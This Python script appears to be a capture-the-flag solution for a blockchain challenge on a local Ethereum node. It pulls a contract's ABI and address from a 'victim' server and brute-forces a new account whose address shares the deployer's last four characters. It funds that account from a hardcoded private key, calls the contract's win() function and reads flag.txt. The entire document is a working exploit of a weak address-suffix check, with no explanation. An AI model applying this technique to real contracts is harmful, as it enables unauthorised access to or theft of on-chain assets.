from time import sleep

import requests
from web3 import Web3
from web3.middleware import geth_poa_middleware

PROVIDER_URL = "http://localhost:8545"
VICTIM_URL = "http://localhost:8000"

w3 = Web3(Web3.HTTPProvider(PROVIDER_URL))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)

account = w3.eth.account.from_key(
    0x868C58E9DD7DE7D470109330295891075E0219322C5CF7497BC15FFE8AD37605
)

Blockchain4 = w3.eth.contract(
    abi=requests.get((f"{VICTIM_URL}/abi.json")).json(),
    address=requests.get((f"{VICTIM_URL}/transaction_receipt.json")).json()[
        "contractAddress"
    ],
)

victim_address = requests.get((f"{VICTIM_URL}/transaction_receipt.json")).json()["from"]
while True:
    attempt = w3.eth.account.create()

    if attempt.address[-4:].lower() == victim_address[-4:].lower():
        break

ether_transaction = {
    "chainId": 42,
    "from": account.address,
    "gas": 21000,
    "gasPrice": 1,
    "nonce": w3.eth.get_transaction_count(account.address),
    "to": attempt.address,
    "value": w3.toWei(1, "ether"),
}
ether_transaction_signed = account.sign_transaction(ether_transaction)
ether_transaction_hash = w3.eth.sendRawTransaction(
    ether_transaction_signed.rawTransaction
)
ether_transaction_receipt = w3.eth.wait_for_transaction_receipt(ether_transaction_hash)

print(ether_transaction_receipt)

contract_transaction = Blockchain4.functions.win().buildTransaction(
    {
        "chainId": 42,
        "gasPrice": 1,
        "from": attempt.address,
        "nonce": w3.eth.get_transaction_count(attempt.address),
    }
)
contract_transaction_signed = attempt.sign_transaction(contract_transaction)
contract_transaction_hash = w3.eth.sendRawTransaction(
    contract_transaction_signed.rawTransaction
)
contract_transaction_receipt = w3.eth.wait_for_transaction_receipt(
    contract_transaction_hash
)

print(contract_transaction_receipt)

sleep(5)

print(requests.get(f"{VICTIM_URL}/flag.txt").text)
